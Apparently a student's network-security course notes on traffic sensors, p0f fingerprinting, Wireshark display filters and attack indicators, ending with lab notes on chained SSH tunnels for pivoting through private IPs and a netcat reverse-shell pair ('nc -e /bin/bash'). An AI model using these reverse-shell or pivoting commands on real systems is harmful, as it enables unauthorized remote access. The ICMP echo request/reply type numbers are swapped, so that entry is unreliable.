
Tools
    • Sensors
        ◦ In-Line
            ▪ Test Access Point (TAP)
            ▪ Man-in-the-Middle (MitM)
        ◦ Out of Band (Passive)
            ▪ Switched Port Analyzer (SPAN)

TAP
	Inline and copies data directly
    • Appliance placed between 2 network devices
    • Best for packet collection with no data loss
    • Must be placed "in line" of network traffic
    • Not Scalable
    • Will need several installed to capture traffic for other network segments
MitM
    • Attacker can use ARP or some other method/protocol
    • Attackers can sniff or manipulate traffic that flows through them
    • Typically must be on the same network as the victim
    • Traffic capture is dependent on the attacker’s system and bandwidth
SPAN
    • Configured on the network Switch
    • Best for packet collection of traffic from several switch ports at once
    • Scalable
    • Can have a high degree of packet loss
    • Places burden on the network Switch
Active fingerprinting
nmap

passive fingerprint
p0f

netbios
https://learn.cnd.ca.gov/Microsoft/NamingConvention/#naming-standards-for-serversP0F (Passive OS Fingerprinting)
    • Looks at variations in initial TTL, fragmentation flag, default IP header packet length, window size, and TCP options
    • Configuration stored in:
 /etc/p0f/p0f.fp
p0f -r <name.pcap>
p0f -r <name.pcap> ‘search filter’
p0f -r <name.pcap> ‘<primitive> search filter’
p0f -r <name.pcap> ‘host 192.168.1.0’
p0f -r <name.pcap> ‘src host 192.168.1.0’ 
p0f -r <name.pcap> ‘dst host 192.168.1.0’ 
p0f -r <name.pcap> ‘host 192.168.1.0’ |  grep ‘apache’


10.4.1.1 Common Wireshark Display filters
Wireshark display filters are a powerful feature that allows users to selectively view network traffic based on specific criteria. These filters enable users to focus on particular packets of interest while disregarding others, making it easier to analyze network communication and identify relevant information.
Here is a list of common and popular Wireshark Display filters.
    • Filtering for a particular protocol will give all packets that have the protocol header in the packet payload.
        ◦ This will NOT show the TCP setup, TCP teardown, or fragmented packets that are part of the communication but do not have the protocol header in payload.
        ◦ We can filter for specific protocols such as:
            ▪ Layer 2: eth, arp, vlan, wlan
            ▪ Layer 3: ip, ipv6, icmp, icmpv6
            ▪ Layer 4: tcp, udp
            ▪ Layer 5: smb, socks, rpc
            ▪ Layer 7: telnet, ssh, http, ssl, tls, quic, dns, ftp, ftp-data, tftp, smtp, pop, imap, dhcp or bootp, ntp, tacplus, radius, rdp
            ▪ Routing protocols: rip, ospf, bgp
    • We can filter for specific addresses:
        ◦ Layer 2: eth.addr, eth.dst ==, eth.src ==
        ◦ Layer 3: ip.addr ==, ip.dst ==, ip.src ==
        ◦ Layer 4: tcp.port ==, tcp.dstport ==, tcp.srcport ==, udp.port ==, udp.dstport ==, udp.srcport ==
    • IPv4 Filters:
        ◦ IHL: ip.hdr_len == 20, ip.hdr_len > 20
        ◦ DSCP: ip.dsfield.dscp > 0, ip.dsfield.dscp == 48
        ◦ ECN: ip.dsfield.ecn > 0. ip.dsfield.ecn == 2
        ◦ Flags: ip.flags.rb == 1, ip.flags.df == 1
        ◦ Fragmentation: (ip.flags.mf == 1) || (ip.frag_offset > 0)
        ◦ TTL: ip.ttl == 64, ip.ttl == 128, ip.ttl < = 64 && ip.ttl > 30 && !(ip.ttl > 64)
        ◦ Protocol: ip.proto == 1, ip.proto == 6, ip.proto == 17
        ◦ 6-in-4 or 6-to-4 encapsulation: ip.proto == 41
    • IPv6 Filters:
        ◦ Traffic Class: ipv6.tclass > 0, ipv6.tclass == 0xe0
        ◦ Next Header: ipv6.nxt == 6, ipv6.nxt == 17, ipv6.nxt == 58
        ◦ 4-in-6 encapsulation: ipv6.nxt == 4
    • TCP Specific Filters:
        ◦ TCP Offset: tcp.hdr_len == 32, tcp.hdr_len > 20
        ◦ TCP Flags:
            ▪ Individual Flags: tcp.flags.syn == 1, tcp.flags.ack == 0, tcp.flags.urg == 1. tcp.flags.reset == 1
            ▪ Flag Combinations: tcp.flags == 0x002, tcp.flags == 0x012, tcp.flags == 0x010, tcp.flags == 0x018
        ◦ Urgent Pointer: tcp.urgent_pointer > 0
    • HTTP specific filters:
        ◦ http.request
        ◦ http.request.method == <method>
            ▪ <method> = GET, POST, HEAD, etc.
        ◦ http.response
        ◦ http.response.code == <code>
            ▪ 100, 200, 300, 400, etc.
        ◦ http.user_agent, http.user_agent == "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2) Gecko/20070219 Firefox/2.0.0.2", !(http.user_agent == "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2) Gecko/20070219 Firefox/2.0.0.2")
    • DNS filters:
        ◦ Query: A = dns.qry.type == 1, NS = dns.qry.type == 2, SOA = dns.qry.type == 6, AAAA = dns.qry.type == 28, AXFR = dns.qry.type == 252
        ◦ Response: A = dns.resp.type == 1, NS = dns.resp.type == 2, SOA = dns.resp.type == 6, AAAA = dns.resp.type == 28, AXFR = dns.resp.type == 252
    • SSH Filters:
        ◦ ssh.protocol, ssh.protocol == "SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.1"
    • ARP Filters:
        ◦ ARP Request/Reply: arp.opcode == 1, arp.opcode == 2
        ◦ RARP Request/Reply: arp.opcode == 3, arp.opcode == 4
        ◦ Gratutious ARP: (arp.opcode == 2) && (eth.addr == ff:ff:ff:ff:ff:ff)
    • ICMP Filters:
        ◦ Echo Request: icmp.type == 0
        ◦ Echo Reply: icmp.type == 8
        ◦ Time Exceeded: icmp.type == 11
        ◦ Destination Unreachable and Port Unreachable: (icmp.type == 3) && (icmp.code == 3)
    • DHCP Filters:
        ◦ Client to Server: (udp.srcport == 68) && (udp.dstport == 67)
        ◦ Server to Client: (udp.srcport == 67) && (udp.dstport == 68)
        ◦ Discover: dhcp.option.dhcp == 1
        ◦ Offer: dhcp.option.dhcp == 2
        ◦ Request: dhcp.option.dhcp == 3
        ◦ Ack: dhcp.option.dhcp == 5
    • FTP Filters:
        ◦ Commands: ftp.request.command
        ◦ Sending username or password: ftp.request.command == "USER", ftp.request.command == "PASS"
        ◦ Download file: `ftp.request.command == "RETR"
        ◦ Upload file: ftp.request.command == "STOR"
        ◦ Switch to passive mode: ftp.request.command == "PASV"
        ◦ Directory listing: ftp.request.command == "LIST"
    • Wildcard string filters:
        ◦ data contains "String" - generic filter used to match packets based on the presence of specific data within the packet payload.
        ◦ ip contains "String" - specifically targets the IP (Internet Protocol) layer for payload.
        ◦ http contains "String" - specifically targets the HTTP (Hypertext Transfer Protocol) payload.
    • Using the not feature:
        ◦ Generally you can use any filter used above and surround it like this:
        ◦ !(filter)
    • Conjoining filter expressions:
        ◦ both conditions must be true: and or &&
        ◦ either the first condition or the second condition is true: or or ||

References:
https://wiki.wireshark.org/DisplayFilters
Anomaly Detection
    • Indicator of Attack (IOA)
        ◦ Proactive
        ◦ A series of actions that are suspicious together
        ◦ Focus on Intent
        ◦ Looks for what must happen
            ▪ Code execution. persistence, lateral movement, etc.
Anomaly Detection
    • Indicator of Compromise (IOC)
        ◦ Reactive
        ◦ Forensic Evidence
        ◦ Provides Information that can change
            ▪ Malware, IP addresses, exploits, signatures
Some Indicators
    • .exe/executable files
    • NOP sled
    • Repeated Letters
    • Well Known Signatures
    • Mismatched Protocols
    • Unusual traffic
    • Large amounts of traffic/ unusual times
Signs of IOA
    • Destination IP/Ports
    • Public Servers/DMZs
    • Off-Hours
    • Network Scans
    • Alarm Events
    • Malware Reinfection
    • Remote logins
    • High amounts of some protocols
Signs of IOC
    • Unusual traffic outbound
    • Anomalous user login or account use
    • Size of responses for HTML
    • High number of requests for the same files
    • Using non-standard ports/ application-port mismatch
    • Writing changes to the registry/system files
    • Unexpected/unusual patching or tasks
p0f
Suod p0f -r <name.pcap> > <filename>

vim <filename>
grep -i “caseinsensitivename”
grep -C<#> ‘string’
grep -C4 ‘string’

nc -e
nc -c
 review netcat relay day
attacker’s
	nc -lvp 3333
victim
nc -e /bin/bash <ip> <port>

telnet through first


telnet 10.50.29.19
ssh user@10.50.23.21 -R 21901:localhost:22 -NT
ssh user@localhost -p 21901  -D 9050 -NT

ssh user@localhost -p 21901  -L 21902:10.1.2.18:2222 -NT
ctrl c
ssh user@localhost -p 21902  -D 9050 -NT

ssh user@localhost -p 21902  -L 21903:172.168.10.64:2323 -NT
ctrl c
ssh user@localhost -p 21903  -D 9050 -NT

ssh user@localhost -p 21903  -L 21904:192.168.10.64:22 -NT
ctrl c
ssh user@localhost -p 21904  -D 9050 -NT


Tunnel Practice 3 Box A has no telnet but the firewall between A and B only allows telnet Box B has telnet
common port scanning 21-13, 80 then 1-9999
nc bannergrab


ssh user@10.50.29.89 -p 1234  -D 9050  -NT
ssh user@10.50.29.89 -p 1234  -L 1111:172.17.17.28:23

telnet localhost 1111 
ssh user@

telnet 172.17.17.28
 ssh user@10.50.29.89 -R 21901:localhost:4321 -NT
ssh user@localhost -p 21901  -D 9050 -NT

ssh user@localhost -p 21901  -L 21902:192.168.30.128:1212 -NT
ctrl c
ssh user@localhost -p 21902  -D 9050 -NT

ssh user@localhost -p 21902  -L 21903:10.10.12.0:2932 -NT
ctrl c
ssh user@localhost -p 21903  -D 9050 -NT


